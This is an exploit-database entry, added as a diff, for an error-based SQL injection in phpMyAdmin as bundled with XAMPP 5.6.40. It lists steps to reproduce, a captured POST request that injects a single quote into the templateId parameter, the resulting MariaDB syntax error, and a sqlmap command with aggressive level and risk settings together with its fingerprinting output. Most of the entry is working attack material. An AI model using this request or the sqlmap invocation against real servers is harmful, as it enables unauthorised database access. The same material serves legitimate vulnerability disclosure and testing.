@@ -1,0 +1,62 @@
+id: 39410
+date: 03/05/2024
+title: XAMPP 5.6.40 SQL Injection Vulnerability
+author: Andrey Stoykov
+cves: 
+
+# Exploit Title: XAMPP - Error Based SQL Injection
+# Date: 02/2024
+# Exploit Author: Andrey Stoykov
+# Version: 5.6.40
+# Tested on: Ubuntu 22.04
+# Blog: http://msecureltd.blogspot.com
+
+Steps to Reproduce:
+
+1. Login to phpmyadmin
+2. Visit Export > New Template > test > Create
+3. Navigate to "Existing Templates"
+4. Select template "test" and click "Update"
+5. Trap HTTP POST request
+6. Place single quote to "templateId" parameter
+
+
+// HTTP POST request
+
+POST /phpmyadmin/tbl_export.php HTTP/1.1
+Host: 192.168.159.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+[...]
+
+ajax_request=true&server=1&db=&table=&exportType=server&templateAction=load&templateId=1'&_nocache=170904357625092438&token=%5D%7BwM4%22xq%26%3C%7Fioycy
+
+
+// HTTP response
+
+HTTP/1.1 200 OK
+Date: Tue, 27 Feb 2024 16:44:09 GMT
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
+Perl/v5.16.3
+X-Powered-By: PHP/5.6.40
+[...]
+
+{"success":false,"error":"#1064 - You have an error in your SQL syntax;
+check the manual that corresponds to your MariaDB server version for the
+right syntax to use near '\\' AND `username` = 'root'' at line 1"}
+
+sqlmap -r request.txt --dbms=mysql --threads 10 --level 5 --risk 3
+--fingerprint
+
+[...]
+[16:55:00] [INFO] confirming MySQL
+[16:55:01] [INFO] the back-end DBMS is MySQL
+[16:55:01] [INFO] actively fingerprinting MySQL
+[16:55:02] [INFO] executing MySQL comment injection fingerprint
+web application technology: PHP 5.6.40, Apache 2.4.37
+back-end DBMS: active fingerprint: MySQL >= 5.5
+               comment injection fingerprint: MySQL 5.6.52
+               fork fingerprint: MariaDB
+[...]
+
+#  0day.today [2024-03-06]  #
